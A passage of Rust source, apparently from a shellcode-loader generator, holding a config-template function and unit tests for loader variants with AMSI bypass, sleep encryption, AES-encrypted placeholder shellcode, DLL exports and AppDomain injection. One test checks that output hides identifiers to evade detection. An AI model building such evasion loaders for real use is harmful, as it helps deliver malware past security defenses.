    ctx.insert("clr_version",    &config.clr_version);
    ctx.insert("net_version",    &config.net_version);
    ctx.insert("appdomain_name", &config.appdomain_name);
    ctx.insert("assembly_name",  &config.assembly_name);
    tera.render("appdomain.config.tera", &ctx).map_err(|e| e.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_binary_no_plain_identifiers() {
        let config = LoaderConfig {
            loader_type: LoaderType::Binary,
            features: vec![Feature::SleepEncrypt, Feature::AmsiHwbp],
            encryption: Encryption::Aes256,
            shellcode_hex: "deadbeef".into(),
            key_hex: "aa".repeat(32),
            iv_hex: "bb".repeat(16),
            pe_config: None,
            appdomain_config: None,
            wsf_stub_config: None,
            dotnet_stub_hex: None,
        staged: None,
        };
        let result = generate_loader_source(&config).unwrap();
        assert!(!result.contains("let shellcode "));
        assert!(!result.contains("let key "));
        assert!(result.contains("de") || result.contains("ad")); // shellcode bytes present
    }

    #[test]
    fn test_appdomain_config_xml() {
        let config = AppDomainTemplateConfig {
            clr_version:   "v4.0.30319".into(),
            net_version:   "4.0".into(),
            appdomain_name: "DefaultDomain".into(),
            assembly_name: "DefaultLoader".into(),
        };
        let xml = generate_appdomain_config(&config).unwrap();
        assert!(xml.contains("v4.0.30319"));
        assert!(xml.contains("DefaultDomain"));
        assert!(xml.contains("<configuration>"));
    }

    #[test]
    fn test_dll_template_has_dll_main() {
        let config = LoaderConfig {
            loader_type: LoaderType::Dll,
            features: vec![Feature::AmsiHwbp],
            encryption: Encryption::Aes256,
            shellcode_hex: "cafebabe".into(),
            key_hex: "aa".repeat(32),
            iv_hex: "bb".repeat(16),
            pe_config: None,
            appdomain_config: None,
            wsf_stub_config: None,
            dotnet_stub_hex: None,
        staged: None,
        };
        let source = generate_loader_source(&config).unwrap();
        assert!(source.contains("DllMain"));
        assert!(source.contains("DllRegisterServer"));
    }
}
